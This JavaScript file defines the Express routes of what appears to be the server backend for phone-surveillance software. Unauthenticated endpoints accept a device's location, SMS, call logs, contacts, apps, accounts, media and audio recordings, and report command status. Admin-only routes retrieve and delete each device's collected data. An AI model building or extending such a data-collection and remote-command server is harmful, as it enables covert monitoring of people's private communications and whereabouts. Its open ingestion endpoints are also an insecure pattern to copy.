const express = require('express');
const router = express.Router();
const multer = require('multer');
const {
  receiveLocation,
  receiveSms,
  receiveCallLogs,
  receiveContacts,
  receiveApps,
  receiveAccounts,
  uploadMedia,
  uploadRecording,
  updateCommandStatus,
  getDeviceData,
  deletePhoto,
  deleteRecording,
} = require('../controllers/dataController');
const authMiddleware = require('../middleware/auth');

// Memory storage for Cloudinary uploads (no disk storage)
const upload = multer({
  storage: multer.memoryStorage(),
  limits: { fileSize: 100 * 1024 * 1024 }, // 100MB
});

// Device-facing data endpoints (unauthenticated)
router.post('/location', receiveLocation);
router.post('/sms', receiveSms);
router.post('/calllogs', receiveCallLogs);
router.post('/contacts', receiveContacts);
router.post('/apps', receiveApps);
router.post('/accounts', receiveAccounts);
router.post('/upload-media', upload.single('file'), uploadMedia);
router.post('/upload-recording', upload.single('file'), uploadRecording);
router.post('/command-status', updateCommandStatus);

// Admin data retrieval
router.get('/:deviceId', authMiddleware, getDeviceData);

// Admin delete individual items
router.delete('/photo/:photoId', authMiddleware, deletePhoto);
router.delete('/recording/:recordingId', authMiddleware, deleteRecording);

module.exports = router;